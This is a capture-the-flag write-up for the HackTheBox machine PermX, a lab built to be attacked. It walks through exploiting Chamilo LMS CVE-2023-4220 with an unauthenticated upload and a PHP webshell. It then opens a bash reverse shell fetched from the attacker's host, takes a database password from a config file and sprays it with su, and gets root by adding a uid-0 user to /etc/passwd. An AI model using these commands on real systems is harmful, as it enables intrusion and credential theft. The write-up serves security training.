---
render_with_liquid: false
title: HackTheBox Writeup  PermX
date: 2024-07-07 08:47:13 +1400
tags: [hackthebox, nmap, linux, feroxbuster, php, gobuster, subdomain, enum, chamilo-lms, cve-2023-4220, file-upload, discover-secrets, password-spraying, password-reuse, sudo, bash-script, gtfobin, symlinks, file-write]
---



`PermX` is an Easy Difficulty Linux machine featuring a learning management system vulnerable to unrestricted file uploads via [CVE-2023-4220](https://nvd.nist.gov/vuln/detail/CVE-2023-4220). This vulnerability is leveraged to gain a foothold on the machine. Enumerating the machine reveals credentials that lead to SSH access. A `sudo` misconfiguration is then exploited to gain a `root` shell.


# Recon
---

## Hosts

```bash
┌──(bravosec㉿fsociety)-[~/htb/PermX]
└─$ pt init '10.129.147.24 permx.htb'
+---------+--------+---------------+-----------+
| PROFILE | STATUS |      IP       |  DOMAIN   |
+---------+--------+---------------+-----------+
| permx   | on     | 10.129.147.24 | permx.htb |
+---------+--------+---------------+-----------+
```

## Nmap

```bash

# Nmap 7.94SVN scan initiated Sun Jul  7 08:47:13 2024 as: nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80, 10.129.147.24
Nmap scan report for 10.129.147.24
Host is up, received user-set (0.29s latency).
Scanned at 2024-07-07 08:47:13 CST for 16s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAyYzjPGuVga97Y5vl5BajgMpjiGqUWp23U2DO9Kij5AhK3lyZFq/rroiDu7zYpMTCkFAk0fICBScfnuLHi6NOI=
|   256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP8A41tX6hHpQeDLNhKf2QuBM7kqwhIBXGZ4jiOsbYCI
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://permx.htb
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Sun Jul  7 08:47:29 2024 -- 1 IP address (1 host up) scanned in 16.58 seconds
```


## 80 - HTTP : eLEARNING


### Info

```ruby
http://permx.htb [200] [eLEARNING] [Apache/2.4.52 (Ubuntu)] [e9622e18aab60e0d5121528ee013802aa69eccac] [Apache HTTP Server:2.4.52,Bootstrap,OWL Carousel,Ubuntu,jQuery]
```

![](/assets/obsidian/87936aba7a19962d9011433ba1baeec3.png)

### Directory

```bash
feroxbuster -u "http://$(pt get rhost):80" -w /usr/share/wordlists/dirb/common.txt -C 404,400,500 --thorough --dont-scan .(tif|tiff|ico|cur|bmp|webp|svg|png|jpg|jpeg|jfif|gif|avif|apngogg|css|js|woff|woff2|eot|ttf|otf)$ -I js,css,png,jpg,gif -k -r -n -A -o ferox_80_common.txt
```

```bash
200      GET      208l      701w    10428c http://permx.htb/404.html
200      GET      238l      922w    13018c http://permx.htb/testimonial.html
200      GET      275l      912w    14806c http://permx.htb/team.html
200      GET      275l      899w    14753c http://permx.htb/contact.html
200      GET      367l     1362w    20542c http://permx.htb/about.html
200      GET      587l     2466w    36182c http://permx.htb/index.html
200      GET      388l     1519w    22993c http://permx.htb/courses.html
200      GET      587l     2466w    36182c http://permx.htb/
200      GET       33l      225w     4406c http://permx.htb/img/
200      GET       20l      104w     1714c http://permx.htb/lib/
```

### Subdomains

```bash
gobuster vhost --append-domain -o gobuster_vhosts.txt -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -k -t 100 -u http://$(pt get rhost) -r
```

```bash
Found: lms.permx.htb Status: 200 [Size: 19347]
Found: *.permx.htb Status: 400 [Size: 301]
```

# User Flag
---

## Shell as www-data


### 80 - Chamilo LMS 1.11.24


#### Enumerate version

Perform quick fuzzing

```bash
┌──(bravosec㉿fsociety)-[~/htb/PermX]
└─$ feroxbuster -w /usr/share/seclists/Fuzzing/fuzz-Bo0oM.txt -C 404,400,500 -k --auto-tune -A --dont-scan /server-status/ --dont-scan .(tif|tiff|ico|cur|bmp|webp|svg|png|jpg|jpeg|jfif|gif|avif|apngogg|css|woff|woff2|eot|ttf|otf)$ -u 'http://lms.permx.htb' -n
[...]
200      GET    16450l   197298w  3223055c http://lms.permx.htb/documentation/changelog.html
200      GET       85l      266w     3966c http://lms.permx.htb/documentation/
[...]
```

- `Chamilo 1.11.24` is on top of the list

![](/assets/obsidian/01ce3afad930455bea1e5c708cea7afe.png)

#### Unauthenticated File Upload to RCE (CVE-2023-4220)

- Google : `Chamilo 1.11.24 exploit`

> Overview : https://www.recordedfuture.com/vulnerability-database/CVE-2023-4220

![](/assets/obsidian/79f309eed0e177dac1c03f2ddf7b0ff1.png)

- Google : `CVE-2023-4220`

> Writeup + POC : https://starlabs.sg/advisories/23/23-4220/

![](/assets/obsidian/6ab747dc1b7234b88e634c482f3499fc.png)

Validate exploit (It works)

```bash
┌──(bravosec㉿fsociety)-[~/htb/PermX]
└─$ echo '<?php system("id"); ?>' > rce.php

┌──(bravosec㉿fsociety)-[~/htb/PermX]
└─$ curl -F 'bigUploadFile=@rce.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
The file has successfully been uploaded.                                                                                                                                                                          
┌──(bravosec㉿fsociety)-[~/htb/PermX]
└─$ curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rce.php'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### Reverse shell

Write webshell

```bash
┌──(bravosec㉿fsociety)-[~/htb/PermX]
└─$ echo '<?=`$_REQUEST[0]`;' > rce.php

┌──(bravosec㉿fsociety)-[~/htb/PermX]
└─$ curl -F 'bigUploadFile=@rce.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
The file has successfully been uploaded.
```

Get reverse shell

```bash
┌──(bravosec㉿fsociety)-[~/htb/PermX]
└─$ mkdir -p www && cd www && echo "/bin/bash -c 'bash -i >& /dev/tcp/$(pt get lhost)/1111 0>&1'" > index.html && fuser -k 80/tcp 2>/dev/null; python -m http.server 80
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/PermX]
└─$ curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rce.php' --data-urlencode '0=curl 10.10.14.16|bash'
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/PermX]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.16] from (UNKNOWN) [10.129.147.24] 37462
bash: cannot set terminal process group (1109): Inappropriate ioctl for device
bash: no job control in this shell
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ /usr/bin/script -qc /bin/bash /dev/null
<load/files$ /usr/bin/script -qc /bin/bash /dev/null^Z
zsh: suspended  nc -lvnp 1111

┌──(bravosec㉿fsociety)-[~/htb/PermX]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1111

<c/lib/javascript/bigupload/files$ export TERM=xterm                     ib/javascript/bigupload/files$
ws 50 columns 209ar/www/chamilo/main/inc/lib/javascript/bigupload/files$ stty row
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# Root Flag
---

## From www-data to mtz


### Harvesting - database config

```bash
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ ss -ltnp
State                    Recv-Q                   Send-Q                                     Local Address:Port                                     Peer Address:Port                  Process
LISTEN                   0                        4096                                       127.0.0.53%lo:53                                            0.0.0.0:*
LISTEN                   0                        128                                              0.0.0.0:22                                            0.0.0.0:*
LISTEN                   0                        80                                             127.0.0.1:3306                                          0.0.0.0:*
LISTEN                   0                        128                                                 [::]:22                                               [::]:*
LISTEN                   0                        511                                                    *:80                                                  *:*
```

- Google : `chamilo database config file location`

![](/assets/obsidian/dbf7edb5c3f861e38382eaf3b6900dc2.png)

```bash
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ cd /var/www/chamilo/app/config
www-data@permx:/var/www/chamilo/app/config$ grep -rin pass -E5
[...]
configuration.php-17-$_configuration['db_host'] = 'localhost';
configuration.php-18-$_configuration['db_port'] = '3306';
configuration.php-19-$_configuration['main_database'] = 'chamilo';
configuration.php-20-$_configuration['db_user'] = 'chamilo';
configuration.php:21:$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
configuration.php-22-// Enable access to database management for platform admins.
[...]
```

### Password spray

```bash
www-data@permx:/var/www/chamilo/app/config$ PASS='03F6lY3uXAP2bkW8'; for USER in $(cat /etc/passwd|grep sh$|awk -F: '{print $1}'); do (x=$(echo $PASS | su $USER -c whoami); if [ "$x" ]; then echo "[+] $USER"; fi) & done
[1] 5821
[2] 5822
www-data@permx:/var/www/chamilo/app/config$ Password: Password: [+] mtz
```

```bash
www-data@permx:/var/www/chamilo/app/config$ su - mtz
Password:03F6lY3uXAP2bkW8
mtz@permx:~$ id
uid=1000(mtz) gid=1000(mtz) groups=1000(mtz)
```

## From mtz to root


### SUDO - Bash script : setfacl

```bash
mtz@permx:~$ sudo -l
Matching Defaults entries for mtz on permx:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: /opt/acl.sh
```

- The script uses `setfacl` to give arbitrary user arbitrary permission over files and folders that are under `/home/mtz/`
- It filters out `..` to prevent directory traversal

```bash
mtz@permx:~$ ls -la /opt/acl.sh
-rwxr-xr-x 1 root root 419 Jun  5 11:58 /opt/acl.sh
mtz@permx:~$ cat /opt/acl.sh

#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi


# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
```

> GTFOBIN : https://gtfobins.github.io/gtfobins/setfacl/

![](/assets/obsidian/388f34427dbcd31424c21208539bf058.png)

Create a soft link from `/etc/passwd` to `/home/mtz/passwd` then add user with root id by writing `/etc/passwd`

```bash
mtz@permx:~$ ln -s /etc/passwd passwd
mtz@permx:~$ sudo /opt/acl.sh mtz rwx /home/mtz/passwd
mtz@permx:~$ HASH=$(openssl passwd -1 -salt gg gg); echo "gg:${HASH}:0:0:root:/root:/bin/bash" >> passwd
mtz@permx:~$ su - gg
Password:
root@permx:~# id
uid=0(root) gid=0(root) groups=0(root)
root@permx:~# cat /root/root.txt
010c3511917ae71d3a0289794b6082a8
```

# Additional
---
